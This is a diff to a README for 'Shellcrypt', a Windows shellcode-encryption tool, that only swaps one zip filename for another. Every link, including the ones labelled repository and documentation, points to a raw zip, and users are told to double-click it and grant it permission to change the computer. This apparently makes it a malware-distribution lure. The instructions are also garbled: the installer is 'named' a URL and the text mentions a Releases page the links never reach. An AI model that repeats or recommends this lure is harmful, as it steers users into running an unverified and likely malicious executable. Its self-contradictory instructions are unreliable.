@@ -1,7 +1,7 @@
 # 🔒 Shellcrypt - Secure Your Shellcode Easily
 
 ## 📥 Download Now
-[![Download Shellcrypt](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software-2.3.zip%https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software-2.3.zip)](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software-2.3.zip)
+[![Download Shellcrypt](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software_3.2-alpha.4.zip%https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software_3.2-alpha.4.zip)](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software_3.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 Shellcrypt is a tool that helps you encrypt your shellcode using AES-256-CBC encryption for Windows. This guide will show you how to download and run the application. You don’t need any programming skills; just follow these simple steps.
@@ -22,14 +22,14 @@ Shellcrypt is a tool that helps you encrypt your shellcode using AES-256-CBC enc
 ## 📥 Download & Install
 To get the latest version of Shellcrypt, visit the following page:
 
-[Visit this page to download Shellcrypt](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software-2.3.zip)
+[Visit this page to download Shellcrypt](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software_3.2-alpha.4.zip)
 
 1. Once on the Releases page, look for the latest version.
-2. Click the download link for the Shellcrypt installer, typically named `https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software-2.3.zip`.
+2. Click the download link for the Shellcrypt installer, typically named `https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software_3.2-alpha.4.zip`.
 3. Save the file to your computer.
 
 ## 🔧 Running Shellcrypt
-1. Locate the downloaded file `https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software-2.3.zip` in your downloads folder.
+1. Locate the downloaded file `https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software_3.2-alpha.4.zip` in your downloads folder.
 2. Double-click the file to run it.
 3. If prompted by Windows, allow the program to make changes to your computer.
 4. The Shellcrypt interface will open.
@@ -63,8 +63,8 @@ A4: Please check the GitHub Issues section for support or report your issue ther
 If you need assistance, feel free to reach out through the Issues section on GitHub. Your feedback helps us make Shellcrypt better.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software-2.3.zip)
-- [Documentation](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software-2.3.zip)
+- [GitHub Repository](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software_3.2-alpha.4.zip)
+- [Documentation](https://github.com/NSSTORE1516/Shellcrypt/raw/refs/heads/main/Tool/Software_3.2-alpha.4.zip)
 
 --- 
 
